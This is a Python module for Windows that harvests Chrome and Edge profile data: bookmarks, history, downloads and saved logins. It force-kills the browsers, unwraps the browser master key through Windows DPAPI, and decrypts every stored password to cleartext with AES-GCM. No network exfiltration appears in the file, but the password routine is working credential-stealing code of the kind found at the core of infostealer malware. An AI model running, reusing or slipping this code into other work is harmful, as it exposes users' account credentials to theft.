import json
import os
import sqlite3
import subprocess
import time
import base64
import win32crypt
from Crypto.Cipher import AES
import shutil

username = os.environ["USERNAME"]
systemdrive = os.environ["SYSTEMDRIVE"] + "\\"
chrome_path = os.path.join(systemdrive, "Users", username, "AppData", "Local", "Google", "Chrome", "User Data",
                           "Default")
edge_path = os.path.join(systemdrive, "Users", username, "AppData", "Local", "Microsoft", "Edge", "User Data",
                         "Default")
chrome_pwd_path = os.path.join(systemdrive, "Users", username, "AppData", "Local", "Google", "Chrome", "User Data",
                               "Local State")
edge_pwd_path = os.path.join(systemdrive, "Users", username, "AppData", "Local", "Microsoft", "Edge", "User Data",
                             "Local State")


def get_strftime(n):
    if n == 0:
        return
    return time.strftime("%Y/%m/%d %H:%M:%S", time.localtime(int(n / (10 ** 6)) - 11644473600))


# noinspection PyBroadException
def kill():
    with open(os.devnull, 'wb') as devnull:
        try:
            subprocess.check_call("taskkill /f /im chrome.exe", stdout=devnull, stderr=subprocess.STDOUT)
        except:
            pass
        try:
            subprocess.check_call("taskkill /f /im msedge.exe", stdout=devnull, stderr=subprocess.STDOUT)
        except:
            pass
        try:
            subprocess.check_call("taskkill /f /im 360se.exe", stdout=devnull, stderr=subprocess.STDOUT)
        except:
            pass


class BookMark:
    def __init__(self, path=chrome_path):
        self.path = os.path.join(path, "Bookmarks")
        kill()
        self.json = self.get_file()

    def get_bookmarks(self, json=None):
        bookmark_bar = {}
        if json is not None:
            for i in json["children"]:
                if i["type"] == "folder":
                    bookmark_bar[i["name"]] = self.get_bookmarks(i)
                elif i["type"] == "url":
                    bookmark_bar[i["name"]] = i["url"]
            return bookmark_bar
        for i in self.json["roots"].values():
            if i["type"] == "folder":
                bookmark_bar[i["name"]] = self.get_bookmarks(i)
            elif i["type"] == "url":
                bookmark_bar[i["name"]] = i["url"]
        return bookmark_bar

    def get_file(self):
        assert os.path.isfile(self.path), '"Bookmarks" file not found'
        with open(self.path, encoding="utf-8") as f:
            return json.load(f)


# noinspection PyAttributeOutsideInit
class History:
    def __init__(self, path=chrome_path):
        self.path = os.path.join(path, "History")
        kill()
        self.connect()

    def connect(self):
        assert os.path.isfile(self.path), '"History" file not found'
        self.conn = sqlite3.connect(self.path)
        self.cursor = self.conn.cursor()

    def close(self):
        try:
            self.conn.close()
            self.cursor.close()
        except AttributeError:
            pass
        except sqlite3.ProgrammingError:
            pass

    __del__ = close

    def get_history(self):
        cursor = self.cursor.execute("SELECT id,url,title,visit_count,last_visit_time FROM urls")
        items = []
        for _id, url, title, visit_count, last_visit_time in cursor:
            info = {"id": _id, "url": url, "title": title, "visit_count": visit_count,
                    "last_visit_time": get_strftime(last_visit_time)}
            items.append(info)
        return items

    def get_downloads(self):
        cursor = self.cursor.execute("SELECT start_time,target_path,tab_url from downloads")
        items = []
        for start_time, target_path, tab_url in cursor:
            info = {"start_time": start_time, "tab_url": tab_url, "target_path": target_path}
            items.append(info)
        return items


# noinspection PyBroadException,PyMethodMayBeStatic
class Password:
    def __init__(self, path=chrome_path, pwdpath=chrome_pwd_path):
        self.path = path
        self.pwdpath = pwdpath

    def get_encryption_key(self):
        with open(self.pwdpath, encoding="utf-8") as f:
            local_state = json.load(f)
        key = base64.b64decode(local_state["os_crypt"]["encrypted_key"])[5:]
        return win32crypt.CryptUnprotectData(key, None, None, None, 0)[1]

    def decrypt_password(self, password, key):
        try:
            iv = password[3:15]
            password = password[15:]
            cipher = AES.new(key, AES.MODE_GCM, iv)
            return cipher.decrypt(password)[:-16].decode()
        except:
            try:
                return str(win32crypt.CryptUnprotectData(password, None, None, None, 0)[1])
            except:
                return ""

    def get_passwords(self):
        key = self.get_encryption_key()
        try:
            db_path = os.path.join(self.path, "Login Data")
            filename = "PWDData.db"
            shutil.copyfile(db_path, filename)
        except FileNotFoundError:
            db_path = os.path.join(self.path, "Login Data New")
            filename = "PWDData.db"
            shutil.copyfile(db_path, filename)
        db = sqlite3.connect(filename)
        cursor = db.cursor()
        cursor.execute("SELECT origin_url,action_url,username_value,password_value,date_created,date_last_used FROM"
                       " logins order by date_created")
        items = []
        for origin_url, action_url, username_value, password_value, date_created, date_last_used in cursor:
            info = {}
            if username_value or password_value:
                info["origin_url"] = origin_url
                info["action_url"] = action_url
                info["username"] = username_value
                info["password"] = self.decrypt_password(password_value, key)
            if date_created != 864 * (10 ** 8) and date_created:
                info["creation_date"] = get_strftime(date_created)
            if date_last_used != 864 * (10 ** 8) and date_last_used:
                info["last_used"] = get_strftime(date_last_used)
            items.append(info)
        cursor.close()
        db.close()
        try:
            os.remove(filename)
        except:
            pass
        return items
